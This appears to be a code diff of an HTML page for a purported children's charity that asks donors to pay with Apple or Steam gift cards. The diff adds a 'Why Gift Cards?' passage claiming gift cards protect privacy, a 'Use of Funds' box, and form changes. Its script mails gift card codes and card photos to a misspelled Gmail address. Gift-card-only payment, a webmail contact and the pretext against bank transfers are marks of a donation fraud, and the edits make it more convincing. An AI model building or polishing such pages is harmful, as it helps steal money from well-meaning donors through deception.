@@ -8,20 +8,22 @@
         :root { --primary: #2c3e50; --accent: #3498db; --light: #f4f7f6; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; color: #333; background: var(--light); }
         header { background: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
-        .logo { font-weight: bold; font-size: 1.2rem; color: var(--primary); }
-        .menu-btn { cursor: pointer; font-size: 1.5rem; border: none; background: none; }
+        .logo { font-weight: bold; font-size: 1.1rem; color: var(--primary); }
+        .menu-btn { cursor: pointer; font-size: 1.5rem; border: none; background: none; color: var(--primary); }
         .side-menu { position: fixed; top: 0; right: -300px; width: 250px; height: 100%; background: var(--primary); color: white; transition: 0.3s; padding-top: 60px; z-index: 999; }
         .side-menu a { display: block; padding: 15px 25px; color: white; text-decoration: none; font-size: 1.1rem; border-bottom: 1px solid #3e4f5f; }
         .side-menu.active { right: 0; }
         .close-btn { position: absolute; top: 20px; left: 20px; color: white; background: none; border: none; font-size: 1.5rem; cursor: pointer; }
-        section { padding: 60px 20px; max-width: 800px; margin: auto; display: none; }
+        section { padding: 40px 20px; max-width: 800px; margin: auto; display: none; min-height: 80vh; }
         section.active { display: block; }
         .hero-img { width: 100%; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         .homepage-text { text-align: center; line-height: 1.6; }
+        .info-box { background: white; padding: 20px; border-radius: 8px; border-left: 5px solid var(--accent); margin-bottom: 25px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
         .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; }
-        input, select, textarea { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        .btn-submit { background: var(--accent); color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-size: 1rem; cursor: pointer; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; font-size: 0.9rem; }
+        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; background: white; }
+        .btn-submit { background: var(--accent); color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-size: 1rem; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        h2 { color: var(--primary); border-bottom: 2px solid var(--accent); padding-bottom: 10px; }
     </style>
 </head>
 <body>
@@ -51,26 +53,43 @@
     <section id="about">
         <h2>About Our Good Works</h2>
         <p>The Happy Madison Children’s Relief Fund specializes in caring for children battling Chronic Pelvic Pain Syndrome (CPPS). We currently provide full care for over 500 children.</p>
-        <p>Our work focuses on three pillars: Specialized Pediatric Feeding, Medical Intervention, and Safe Housing. To protect the privacy of the children and families, we keep our specific home locations confidential.</p>
+        <p>Our work focuses on three pillars: Specialized Pediatric Feeding, Medical Intervention, and Safe Housing. To protect the privacy of the children and homes, we do not publish specific locations, but our impact is seen in every smile.</p>
         <img src="77316900940097b984b663afdd1321ef.jpg" alt="Helping" class="hero-img">
     </section>
 
     <section id="support">
         <h2>Administrative Support</h2>
-        <p>For inquiries regarding our initiatives or if you need assistance, please contact our management team directly.</p>
-        <p><strong>Email:</strong> teammangementt@gmail.com</p>
+        <p>If you have questions regarding our initiatives or would like to verify information, please contact our management team directly.</p>
+        <div class="info-box">
+            <strong>Official Management Email:</strong><br>
+            teammangementt@gmail.com
+        </div>
         <img src="IMG_20260510_193422.jpg" alt="Support" class="hero-img">
     </section>
 
     <section id="donation">
         <h2>Support the Children</h2>
-        <p>Your contributions go directly toward the feeding, medicine, and shelter of the 500+ children under our care. This support is not compulsory, but your kindness makes a world of difference.</p>
+        
+        <div class="info-box">
+            <h3>Use of Funds</h3>
+            <p>100% of your contributions are utilized for:</p>
+            <ul>
+                <li><strong>Medical Care:</strong> Specialized treatment for children with CPPS.</li>
+                <li><strong>Pediatric Feeding:</strong> Specialized nutrition programs for growth.</li>
+                <li><strong>Safe Shelter:</strong> Maintaining secure, private homes for recovery.</li>
+            </ul>
+        </div>
+
+        <div class="info-box">
+            <h3>Why Gift Cards?</h3>
+            <p>To maintain the absolute <strong>privacy and security</strong> of our private homes and international donors, we utilize a manual manual payment portal via verified gift cards. This allows for immediate, cross-border medical funding without the delays or public tracking associated with traditional international banking, ensuring the children receive care without interruption.</p>
+        </div>
         
         <form id="donationForm">
             <div class="form-group">
                 <label>Identify as:</label>
                 <select id="anonStatus" onchange="toggleName()">
-                    <option value="Named">Put my name</option>
+                    <option value="Named">Show my name</option>
                     <option value="Anonymous">Anonymous</option>
                 </select>
             </div>
@@ -83,7 +102,7 @@
                 <input type="number" id="amount" placeholder="e.g. 500">
             </div>
             <div class="form-group">
-                <label>Card Type:</label>
+                <label>Select Card Type:</label>
                 <select id="cardType">
                     <option value="Apple Gift Card">Apple Gift Card</option>
                     <option value="Steam Gift Card">Steam Gift Card</option>
@@ -95,12 +114,12 @@
                 <input type="text" id="eCode" placeholder="Enter code here">
             </div>
             <div class="form-group">
-                <label>Upload Card Image:</label>
+                <label>Upload Card Image (required after submit):</label>
                 <input type="file" id="cardImage">
             </div>
             <div class="form-group">
                 <label>Message / Prayer Request:</label>
-                <textarea id="message" rows="4" placeholder="Your message..."></textarea>
+                <textarea id="message" rows="3" placeholder="Write your message here..."></textarea>
             </div>
             <button type="button" class="btn-submit" onclick="submitDonation()">Submit Donation Details</button>
         </form>
@@ -126,7 +145,7 @@
             const code = document.getElementById('eCode').value;
             const msg = document.getElementById('message').value;
             const subject = encodeURIComponent("New Donation Confirmation - " + name);
-            const body = encodeURIComponent("Hello Administrative Office,\n\nI would like to support the children's fund.\n\nDonor: " + name + "\nAmount: $" + amount + "\nCard Type: " + card + "\nCode: " + code + "\nMessage/Prayer: " + msg + "\n\n(Note: Please attach your card photo to this email before sending)");
+            const body = encodeURIComponent("Hello Administrative Office,\n\nI would like to support the children's fund.\n\nDonor: " + name + "\nAmount: $" + amount + "\nCard Type: " + card + "\nCode: " + code + "\nMessage/Prayer: " + msg + "\n\n(Note: I have completed the submission. Please find the attached card photo for verification.)");
             window.location.href = `mailto:teammangementt@gmail.com?subject=${subject}&body=${body}`;
         }
     </script>
